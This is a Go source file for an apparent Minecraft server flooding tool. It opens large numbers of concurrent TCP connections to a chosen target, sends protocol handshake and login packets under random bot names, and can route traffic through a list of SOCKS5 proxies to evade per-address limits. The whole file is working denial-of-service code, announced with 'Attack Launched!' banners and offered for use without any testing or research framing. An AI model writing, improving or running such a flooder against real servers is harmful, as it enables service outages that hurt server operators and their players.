package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"golang.org/x/net/proxy"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Constants for packet types
const (
	PACKET_HANDSHAKE = 0x00
)

// Global variables to track connection metrics
var (
	connectionCount   int32
	failedConnections int32
	maxCPS            int32
	proxies           []string
)

// BotConfig structure
type BotConfig struct {
	ip                      string
	port                    int
	protocol                int
	debug                   bool
	stop                    bool
	mode                    int
	totalBotsConnected      int
	botsConnectedThisSecond int
	lock                    sync.Mutex
}

// Helper functions for random name generation and Varint encoding
func generateRandomName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func writeVarint(value int) []byte {
	var buffer []byte
	for {
		temp := value & 0x7F
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buffer = append(buffer, byte(temp))
		if value == 0 {
			break
		}
	}
	return buffer
}

// Function to handle the connection for a single bot
func handleConnection(config *BotConfig, loginMode bool, proxyAddress string) {
	name := generateRandomName(10)
	nameLen := len(name)

	var conn net.Conn
	var err error

	// If proxyAddress is not empty, use SOCKS5 proxy
	if proxyAddress != "" {
		// Determine the type of proxy (SOCKS5)
		proxyParts := strings.Split(proxyAddress, ":")
		proxyIp := proxyParts[0]
		proxyPort := proxyParts[1]

		// SOCKS5 proxy
		dialer, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%s", proxyIp, proxyPort), nil, proxy.Direct)
		if err != nil {
			if config.debug {
				fmt.Println("Failed to create SOCKS5 dialer:", err)
			}
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		conn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			if config.debug {
				fmt.Println("Connection through proxy failed:", err)
			}
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	} else {
		// Direct connection without proxy
		conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			if config.debug {
				fmt.Println("Failed to establish direct connection:", err)
			}
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	}
	defer conn.Close()

	// Send handshake packet
	handshake := []byte{0x00}
	handshake = append(handshake, writeVarint(config.protocol)...)
	handshake = append(handshake, writeVarint(len(config.ip))...)
	handshake = append(handshake, []byte(config.ip)...)
	port := make([]byte, 2)
	binary.BigEndian.PutUint16(port, uint16(config.port))
	handshake = append(handshake, port...)
	handshake = append(handshake, 0x02)

	lengthPrefix := writeVarint(len(handshake))
	if _, err := conn.Write(append(lengthPrefix, handshake...)); err != nil {
		if config.debug {
			fmt.Println("Failed to send handshake packet:", err)
		}
		atomic.AddInt32(&failedConnections, 1)
		return
	}

	// If loginMode is true, send login start packet
	if loginMode {
		loginStart := []byte{0x00}
		loginStart = append(loginStart, writeVarint(nameLen)...)
		loginStart = append(loginStart, []byte(name)...)

		lengthPrefix = writeVarint(len(loginStart))
		if _, err := conn.Write(append(lengthPrefix, loginStart...)); err != nil {
			if config.debug {
				fmt.Println("Failed to send login start packet:", err)
			}
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		if config.debug {
			fmt.Printf("Bot joined: %s\n", name)
		}

		config.lock.Lock()
		config.totalBotsConnected++
		config.botsConnectedThisSecond++
		config.lock.Unlock()
	}

	atomic.AddInt32(&connectionCount, 1)
}

// attackLoop creates multiple connections to the server and tracks the success and failure counts
func attackLoop(serverIp string, serverPort int, protocol int, duration int, threadId int, wg *sync.WaitGroup, loginMode bool, useProxies bool) {
	defer wg.Done() // Ensure the wait group is decremented when done

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		// Randomly select a proxy if useProxies is true
		proxyAddress := ""
		if useProxies {
			proxyAddress = proxies[rand.Intn(len(proxies))]
		}

		config := &BotConfig{
			ip:       serverIp,
			port:     serverPort,
			protocol: protocol,
			debug:    false,
		}
		handleConnection(config, loginMode, proxyAddress)
	}
}

// printConnectionCount periodically prints the current and average CPS, and the count of failed connections
func printConnectionCount(interval float64, duration int, done chan bool) {
	previousCount := int32(0)

	ticker := time.NewTicker(time.Duration(interval * 1000) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentCount := atomic.LoadInt32(&connectionCount)
			currentCPS := currentCount - previousCount

			// Update max CPS if current CPS is higher
			if currentCPS > maxCPS {
				atomic.StoreInt32(&maxCPS, currentCPS)
			}

			fmt.Printf("\r\033[1;34mCPS:\033[0m %d", currentCPS)
			previousCount = currentCount
		case <-done:
			return
		}
	}
}

func main() {
	flag.Usage = func() {
		fmt.Printf("Usage: %s <server_ip:port> <protocol> <duration_seconds> <thread_count> [cpu_cores] [-login] [-proxied]\n", os.Args[0])
		flag.PrintDefaults()
	}
	flag.Parse()

	args := flag.Args()
	if len(args) < 4 || len(args) > 7 {
		flag.Usage()
		return
	}

	serverAddress := strings.Split(args[0], ":")
	if len(serverAddress) != 2 {
		fmt.Println("Invalid format. Use <server_ip:port>")
		return
	}
	serverIp := serverAddress[0]
	serverPort, err := strconv.Atoi(serverAddress[1])
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	protocol, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid protocol: %v\n", err)
		return
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		return
	}
	botCount, err := strconv.Atoi(args[3])
	if err != nil {
		fmt.Printf("Invalid thread count: %v\n", err)
		return
	}

	cpuCores := runtime.NumCPU()
	if len(args) >= 5 {
		cpuCores, err = strconv.Atoi(args[4])
		if err != nil {
			fmt.Printf("Invalid CPU cores: %v\n", err)
			return
		}
		cpuCores = min(cpuCores, runtime.NumCPU())
	}

	loginMode := false
	useProxies := false
	if len(args) >= 6 {
		if args[5] == "-login" {
			loginMode = true
		} else if args[5] == "-proxied" {
			useProxies = true
		}
	}
	if len(args) == 7 && args[6] == "-proxied" {
		useProxies = true
	}

	runtime.GOMAXPROCS(cpuCores)

	// Load proxies from proxies.txt file if useProxies is true
	if useProxies {
		proxies = loadProxies("proxies.txt")
		if len(proxies) == 0 {
			fmt.Println("No proxies loaded. Ensure proxies.txt contains valid proxies.")
			return
		}
	}

	// Print attack launch message
	fmt.Printf("\033[1;36mAttack Launched!\033[0m\n")
	fmt.Printf("\033[1;34mHost:\033[0m %s:%d\n", serverIp, serverPort)
	fmt.Printf("\033[1;34mProtocol:\033[0m %d\n", protocol)
	fmt.Printf("\033[1;34mThreads:\033[0m %d\n", botCount)
	fmt.Printf("\033[1;34mCores:\033[0m %d\n", cpuCores)
	fmt.Printf("\033[1;34mTime:\033[0m %d seconds\n", duration)
	if loginMode {
		fmt.Printf("\033[1;34mMode:\033[0m Login\n")
	} else {
		fmt.Printf("\033[1;34mMode:\033[0m Handshake\n")
	}
	if useProxies {
		fmt.Println("\033[1;34mUsing Proxies\033[0m")
	} else {
		fmt.Println("\033[1;34mNot Using Proxies\033[0m")
	}

	var wg sync.WaitGroup
	wg.Add(botCount)

	done := make(chan bool)
	go func() {
		printConnectionCount(1, duration, done)
	}()

	for i := 0; i < botCount; i++ {
		go attackLoop(serverIp, serverPort, protocol, duration, i, &wg, loginMode, useProxies)
	}

	wg.Wait()
	done <- true

	fmt.Println()
	fmt.Println("\033[1;35mMade by Randomname23233 and hakaneren112 <3\033[0m")
	fmt.Printf("\nAttack completed. MAX CPS: %d\n", atomic.LoadInt32(&maxCPS))
}

// min returns the smaller of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// loadProxies loads proxies from a file
func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Failed to open proxy file: %v\n", err)
		return nil
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("Failed to read proxy file: %v\n", err)
	}

	return proxies
}